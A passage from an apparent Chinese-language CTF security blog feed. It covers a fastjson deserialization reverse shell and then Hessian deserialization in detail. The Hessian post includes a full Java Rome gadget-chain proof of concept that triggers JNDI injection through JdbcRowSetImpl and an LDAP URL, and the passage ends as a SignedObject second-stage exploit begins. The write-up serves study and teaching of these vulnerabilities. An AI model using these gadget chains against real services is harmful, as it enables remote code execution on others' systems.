href="#第三次反序列化（也是反序列化成功的开始）" class="headerlink" title="第三次反序列化（也是反序列化成功的开始）"></a>第三次反序列化（也是反序列化成功的开始）</h3><p>先提前架起ldap服务和vps监听</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239279.png" alt="image-20230505022409515"></p><p>发送payload</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240664.png" alt="image-20230505022432324"></p><p>通过了前面三个类的checkAutoType方法，来到BadAttributeValueExpException的readObject方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240513.png" alt="image-20230505022631154"></p><p>接着触发getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240832.png" alt="image-20230505022649684"></p><p>成功反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240730.png" alt="image-20230505022721373"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessian反序列化</title>
    <link href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessian-反序列化"><a href="#Hessian-反序列化" class="headerlink" title="Hessian 反序列化"></a>Hessian 反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>Remote Procedure Call Protocol，远程过程调用协议，和 RMI（Remote Method Invocation，远程方法调用）类似，都能通过网络调用远程服务，但 RPC 是以标准的二进制格式来定义请求的信息，可用实现跨语言和跨操作系统通讯。</p><p>通讯过程：</p><p>1.客户端发起请求，并按照 RPC 协议格式填充信息<br>2.填充完毕后将二进制格式文件转化为流，通过传输协议进行传输<br>3.服务端接收到流后，将其转换为二进制格式文件，并按照 RPC 协议格式获取请求信息并进行处理<br>4.处理完毕后将结果按照 RPC 协议格式写入二进制格式文件中并返回</p><p>maven 添加扩展：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hessian<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.63<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Hessian反序列化与原生反序列化的区别"><a href="#Hessian反序列化与原生反序列化的区别" class="headerlink" title="Hessian反序列化与原生反序列化的区别"></a>Hessian反序列化与原生反序列化的区别</h3><p>示例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Code</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;ttt&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">222</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span>&#123;<br>        System.out.print(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原生序列化反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser);<br>        oser.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        oser.close();<br><br>        System.out.println(ser);<br>        ObjectInputStream unser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        Object newobj=unser.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236138.png" alt="image-20230126221405110"></p><p>Hessian序列化反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br><br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235712.png" alt="image-20230126222015375"></p><blockquote><p>从运行结果中可以看出，<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，这也就直接导致JDK原生反序列化的大多数<code>gadget</code>在<code>Hessian</code>反序列化中是不能用的。</p><p>还有一个很重要的区别，<code>hessian</code>反序列化中序列化的类不需要实现序列化接口。</p></blockquote><h3 id="Hessian反序列化漏洞"><a href="#Hessian反序列化漏洞" class="headerlink" title="Hessian反序列化漏洞"></a>Hessian反序列化漏洞</h3><p>虽然<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，但其也有自己的特性，当其反序列化<code>Map</code>类型的对象的时候，会自动调用其<code>put</code>方法，写个demo试试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.put(key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        testMap tt=<span class="hljs-keyword">new</span> <span class="hljs-title class_">testMap</span>();<br>        tt.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        ByteArrayOutputStream ser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(tt);<br>        System.out.println(ser);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235097.png" alt="image-20230126224841023"></p><p>可以看到确实调用了<code>put</code>方法，这时看到<code>HashMap</code>的<code>put</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236935.png" alt="image-20230130233718255"></p><p>对<code>key</code>调用<code>hash</code>方法进行处理</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236365.png" alt="image-20230126225301457"></p><p>只要<code>key</code>不为空，就会调用其<code>hashCode</code>方法，思路一下就打开了，之前看过的利用链中有部分就用到了<code>hashCode</code>方法，比如<code>rome</code>，又比如cc6等。</p><p>就如原生JDK有<code>ysoserial</code>，<code>Hessian</code>也有对应的工具生成<code>paylaod</code>。<a href="https://github.com/mbechler/marshalsec">marshalsec</a>中就集成了<code>Hessian</code>反序列化的<code>gadget</code>，可以使用其生成<code>paylaod</code>，该工具中集成了5个<code>gadget</code></p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringPartiallyComparableAdvisorHolder</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><p>由于 Hessian 会加你个序列化的结果处理成一个 Map，所有序列化的结果的 bytes 的第一个 byte 总为 M（77）,会进入这个case</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> readType();<br><br>      <span class="hljs-keyword">return</span> _serializerFactory.readMap(<span class="hljs-built_in">this</span>, type);<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进readMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readMap</span><span class="hljs-params">(AbstractHessianInput in, String type)</span><br>    <span class="hljs-keyword">throws</span> HessianProtocolException, IOException<br>  &#123;<br>    <span class="hljs-type">Deserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> getDeserializer(type);<br></code></pre></td></tr></table></figure><p>跟进getDeserializer，创建一个 HashMap 作为缓存，先将要反序列化的类作为 key 放入 HashMap 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Deserializer <span class="hljs-title function_">getDeserializer</span><span class="hljs-params">(String type)</span><br>  <span class="hljs-keyword">throws</span> HessianProtocolException<br>&#123;<br>  <span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (deserializer != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (_cachedTypeDeserializerMap == <span class="hljs-literal">null</span>)<br>      _cachedTypeDeserializerMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>      _cachedTypeDeserializerMap.put(type, deserializer);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> deserializer;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会调用 HashMap.put 方法，结合之前分析过的 CC 链，后续调用的 hash 函数能触发任意类的 hashcode 方法。那么只需要找一条入口为 hashcode 的反序列化链即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Rome<br>XBean<br>Resin<br>SpringPartiallyComparableAdvisorHolder<br>SpringAbstractBeanFactoryPointcutAdvisor<br></code></pre></td></tr></table></figure><h2 id="打Rome"><a href="#打Rome" class="headerlink" title="打Rome"></a>打Rome</h2><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> moonflower.hessian;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.ObjectNameDeserializer;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian_Rome</span> &#123;<br><span class="hljs-comment">//包装序列化的函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);<br>        output.writeObject(o);<br>        System.out.println(bao.toString());<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br>    <span class="hljs-comment">//包装反序列化的函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bai</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(bai);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();<br>        <span class="hljs-keyword">return</span> (T) o;<br>    &#125;<br><span class="hljs-comment">//反射设置value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><span class="hljs-comment">//反射获取value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj, String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://localhost:9999/EXP&quot;</span>;<br>        jdbcRowSet.setDataSourceName(url);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(equalsBean, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] s = serialize(hashMap);<br>        System.out.println(s);<br>        System.out.println((HashMap)deserialize(s));<br>    &#125;<br><br>    <span class="hljs-comment">// 用反射动态创建数组，防止在狗仔 gadget 的时候触发 put 方法导致 RCE。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.until.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Rome的rce过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>  _cachedTypeDeserializerMap.put(type, deserializer);<br>&#125;<br></code></pre></td></tr></table></figure><p>进入触发点，接着调用 EqualBean 的 hashcode 方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236540.png" alt="image-20230124203554850"></p><p>接着会触发 ToStringBean 的 toString 方法（这里就有很多其它延申了，比如可以接一个 CC5）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236941.png" alt="image-20230124203614807"></p><p>接着进入 JdbcRowSetImp 的 toString 方法，在其中会调用 JdbcRowSetImp 的 getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236500.png" alt="image-20230124203639615"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236710.png" alt="image-20230124203654578"></p><p>当调用到 getDatabaseMetaData 的时候，会进入 connect 方法，进而调用 lookup 触发 jndi 注入。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236799.png" alt="image-20230124203716717"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236183.png" alt="image-20230124203736906"></p><h2 id="不出网打法（ROME）"><a href="#不出网打法（ROME）" class="headerlink" title="不出网打法（ROME）"></a>不出网打法（ROME）</h2><p><code>hessian</code>反序列化依赖<code>rome</code>的不出网利用方式</p><h4 id="SignedObject二次反序列化"><a href="#SignedObject二次反序列化" class="headerlink" title="SignedObject二次反序列化"></a>SignedObject二次反序列化</h4><p>在<code>java.security.SignedObject</code>中有一个<code>getObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>    b.close();<br>    a.close();<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>是一个原生反序列化，那么就可以利用这里实现二次反序列化从而实现RCE。</p></blockquote><p>EXP</p><figure 